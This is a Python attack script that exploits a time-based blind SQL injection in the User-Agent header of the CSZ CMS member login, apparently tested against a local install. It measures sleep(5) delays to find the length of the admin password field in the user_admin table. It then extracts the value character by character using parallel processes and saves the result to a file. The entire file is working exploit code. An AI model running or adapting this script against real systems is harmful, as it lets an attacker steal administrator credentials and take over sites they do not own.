import requests
import time
import threading
import multiprocessing

pool="admin$ABCDEFGHIJKLMNOPQRSTUVWXYZ"+" "+"bcefghjklopqrstuvwxyz1234567890/."
mutex=0

#获取长度用的User-Agent模板
ual="'-(if((length((select name from user_admin limit 1))=10),sleep(5),1))-'', '127.0.0.1','time') #"


#"Why don't you just build something"
#----------------------------------------------------获取管理员用户名长度--------------------------------------------
def getlength(field,tbname,total):
	ual_head="'-(if((length((select "		#这些空格一定要保留
	ual_middle=" limit 1))="
	num=1
	ual_last="),sleep(5),1))-'', '127.0.0.1','time') #"

	datas={'email':'111@111.com',
		'password':'111'
	}
	
	header={'Host': 'localhost',
			'Content-Length': '74',
			'Cache-Control': 'max-age=0',
			'Origin': 'http://localhost',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent': ual,
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Referer': 'http://localhost/cszcms/member/login',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'zh-CN,zh;q=0.9',
			'Connection': 'close'}

	starttime=time.time()
	for num in range(total):
		header['User-Agent']=ual_head+field+" from "+tbname+ual_middle+str(num)+ual_last
		#print(header['User-Agent'])
		sendtime=time.time()
		response=requests.post(r"http://localhost/cszcms/member/login/check/post",data=datas,headers=header)
		recvtime=time.time()

		doesitwork=recvtime-sendtime
		if(doesitwork>5):
			print("The length is",num)
			print("This step cost:",time.time()-starttime)
			return num
			break
		if(num==total-1):
			return 0

#获取内容用的User-Agent模板
ua="'-(if((ascii(substr((select name from user_admin limit 1), 1, 1))=97),sleep(5),1))-'', '127.0.0.1','time') #"
		
#-----------------------------------------------------获取管理员用户名--------------------------------------------
def getcontent(field,tbname,num,qr,lock):

	#print(num)
	pool="@.tescomadin$ABCDEFGHIJKLMNOPQRSTUVWXYZ"+" "+"bcefghjklpqrstuvwxyz1234567890/."
	
	result=[]
	
	ua_head="'-(if((ascii(substr((select "
	ua_front=" limit 1), "
	ua_middle=", 1))="
	char="A"
	ua_last="),sleep(5),1))-'', '127.0.0.1','time') #"

	datas={'email':'111@111.com',
		'password':'111'
	}
	
	header={'Host': 'localhost',
			'Content-Length': '74',
			'Cache-Control': 'max-age=0',
			'Origin': 'http://localhost',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent': ua,
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Referer': 'http://localhost/cszcms/member/login',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'zh-CN,zh;q=0.9',
			'Connection': 'close'}
	
	for i in range(1):
		for char in pool:
			header['User-Agent']=ua_head+field+" from "+tbname+ua_front+str(num+1)+ua_middle+str(ord(char))+ua_last
			#print(header['User-Agent'])
			
			lock.acquire()
			sendtime=time.time()
			response=requests.post(r"http://localhost/cszcms/member/login/check/post",data=datas,headers=header)
			lock.release()
			
			recvtime=time.time()

			doesitwork=recvtime-sendtime
			if(doesitwork>5):
				#print("It cost:",doesitwork)
				print(num," got:",char)
				#adminnamelist[num]=char	
				result=[num,char]
				qr.put(result)
				break
	
#---------------------------------------------现在！让我们重新揭起救世的大旗！------------------------------------

if __name__=='__main__':

	qr=multiprocessing.Queue()
	lock=multiprocessing.Lock()
	
	field="password"
	tbname="user_admin"

	adminname=""
	adminpwd=""

	getresult=[]
	
	#调用获得长度的函数
	length=getlength(field,tbname,100)	
	print("length is",length)

	processes=[]


	#开线程分别对每个字符匹配
	timehead=time.time()

	for ti in range(length):
		processes.append(multiprocessing.Process(target=getcontent,args=(field,tbname,ti,qr,lock)))
		processes[ti].start()

	for ti in range(length):
		processes[ti].join()
		
	fout=open(field+"out.txt","w+")
	for ci in range(length):
		getresult.append(qr.get())
	print(getresult)
	for ci in range(length):
		for result in getresult:
			if(result[0]==ci):
				print(result[1])
				adminname+=result[1]
				
	fout.write(adminname)
	print(field,":",adminname)
	fout.close()
	print("It took:",time.time()-timehead)